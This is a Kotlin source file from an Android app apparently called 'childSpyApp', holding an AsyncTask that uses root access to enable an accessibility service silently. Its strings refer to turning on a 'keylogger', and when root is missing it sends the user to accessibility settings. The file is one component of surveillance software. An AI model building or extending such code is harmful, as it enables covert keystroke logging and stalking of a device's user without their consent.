package sammy.mutahi.gicheru.childSpyApp.utils

import android.annotation.SuppressLint
import android.app.ProgressDialog
import android.content.Context
import android.os.AsyncTask
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.enableAccessibility
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.isRootAvailable
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.alertDialog
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.openAccessibilitySettings
import com.pawegio.kandroid.indeterminateProgressDialog
import com.pawegio.kandroid.longToast
import sammy.mutahi.gicheru.childSpyApp.R


@SuppressLint("StaticFieldLeak")
class AsyncTaskEnableAccessibility(private val context: Context) : AsyncTask<Void, Boolean, Boolean>() {

    private lateinit var progressDialog: ProgressDialog

    override fun onPreExecute() {
        super.onPreExecute()
        progressDialog = context.indeterminateProgressDialog(R.string.checking_root){setCancelable(false)}
    }

    override fun doInBackground(vararg params: Void?): Boolean {
        if (isRootAvailable()) return enableAccessibility()
        return false
    }

    override fun onPostExecute(result: Boolean) {
        super.onPostExecute(result)
        progressDialog.dismiss()
        if (result) context.longToast(R.string.enable_keylogger_success)
        else
            context.alertDialog(R.string.msg_dialog_enable_keylogger,android.R.string.ok,true){
                context.openAccessibilitySettings()
            }

    }

}